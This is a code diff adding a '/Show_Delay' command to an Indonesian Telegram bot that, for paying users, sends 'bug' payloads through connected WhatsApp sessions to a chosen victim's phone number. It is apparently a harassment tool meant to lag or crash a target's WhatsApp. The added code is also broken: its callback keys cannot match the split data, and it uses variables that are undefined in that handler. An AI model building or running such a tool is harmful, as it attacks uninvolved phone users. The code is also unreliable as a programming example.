@@ -1565,7 +1565,7 @@ bot.on("callback_query", (callbackQuery) => {
         },
       });
     });
-  } else if (data === "owner") {
+  } else if (data === "owner_menu") {
    if (!isOwner(userId)) {
     return bot.answerCallbackQuery(callbackQuery.id, { text: "🚫 Akses ditolak. Hanya untuk Owner.", show_alert: true });
   }
@@ -1615,8 +1615,8 @@ bot.on("callback_query", (callbackQuery) => {
 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。
 
 ╭━━━⭓「 𝐢𝐌𝐀𝐓𝐢𝐎𝐍 ☇ 」
-║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : 𝐇𝐈𝐓𝐌𝐄𝐍𝐂𝐇𝐀𝐎𝐒
-┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 : 𝐂𝐇𝐀𝐎𝐒𝐗𝐍𝐑 
+║ ◇ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : isi
+┃ ◇ 𝐒𝐂𝐑𝐈𝐏𝐓 :  isi
 ║ ◇ 𝐔𝐒𝐄𝐑 : ${username}
 ┃ ◇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 : ${sessions.size}
 ║ ◇ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime()}
@@ -2398,6 +2398,119 @@ bot.onText(/\/trasher(?:\s+(\d+))?/, async (msg, match) => {
   }
 });
 
+bot.onText(/\/Show_Delay (\d+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  if (!isPremium(userId) && !isSupervip(userId)) {
+    return bot.sendMessage(
+      chatId,
+      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
+      { parse_mode: "Markdown" }
+    );
+  }
+
+  const targetNumber = match[1];
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const jid = `${formattedNumber}@s.whatsapp.net`;
+
+  bot.sendPhoto(chatId, "https://files.catbox.moe/rf8qar.jpg", {
+    caption: ` Sellect Button Untuk Mengirim bug ke *${formattedNumber}*`,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "〄𝑪𝒉𝒂𝒐𝒔𝑫𝒆𝒍𝒂𝒚༽", callback_data: `delay_cyuk_${jid}` },
+          { text: "៹𝑫𝒆𝒍𝒂𝒚𝑨𝒍𝒑𝒉𝒂", callback_data: `delay_beneran_${jid}` }
+        ],
+        [
+          { text: "៹𝑫𝒆𝒍𝒂𝒚⏎", callback_data: `delay_bos_${jid}` },
+          { text: "៹𝑫𝒆𝒍𝒂𝒚𝒁𝒊𝒆✇", callback_data: `delay_real_${jid}` }
+        ],
+        [ 
+          { text: "𝑫𝒆𝒍𝒂𝒚𝑻𝒓𝒂𝒗", callback_data: `delay_serius_${jid}` },
+          { text: "➷𝑫𝒆𝒍𝒂𝒚𝑽𝒐𝒖𝒓𝒕𝒉➹", callback_data: `delay_beneran_${jid}` }  
+        ]
+      ],
+    },
+  });
+});
+
+bot.on("callback_query", async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+  const data = callbackQuery.data;
+  const userId = callbackQuery.from.id;
+
+  if (!isPremium(userId) && !isSupervip(userId)) {
+    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*", { parse_mode: "Markdown" });
+  }
+
+  const [bugType, jid] = data.split("_");
+  
+  const bugTypes = {
+    "delay_cyuk": [sickdelay], 
+    "delay_nih": [sickdelay], 
+    "delay_bos": [sickdelay], 
+    "delay_real": [sickdelay], 
+    "delay_serius": [sickdelay], 
+    "delay_beneran": [sickdelay], 
+  };
+
+  if (!bugTypes[bugType]) {
+    return;
+  }
+
+  if (sessions.size === 0) {
+    return bot.sendMessage(chatId, "⚠️ Tidak ada bot WhatsApp yang terhubung.");
+  }
+
+  bot.answerCallbackQuery(callbackQuery.id);
+
+  let successCount = 0;
+  let failCount = 0;
+
+  for (const [botNum, sock] of sessions.entries()) {
+    try {
+      if (!sock.user) {
+        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
+        await initializeWhatsAppConnections();
+        continue;
+      }
+      for (const bugFunction of bugTypes[bugType]) {
+        await bugFunction(sock, jid);
+      }
+      successCount++;
+    } catch (error) {
+      failCount++;
+    }
+  }
+
+  bot.sendMessage(
+    chatId,
+   `
+\`\`\`
+
+╭━━━⭓「 SENDING BUG 」
+║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
+┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
+┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : 𝑫𝒆𝒍𝒂𝒚
+║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
+╰━━━━━━━━━━━━━━━━━━⭓
+
+\`\`\``,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { 
+              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
+              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
+            },
+          ],
+        ],
+      },
+    });
+    ;
 
 // !! [ COMBO FUNCTION SECTION ] !!
 // jid itu target
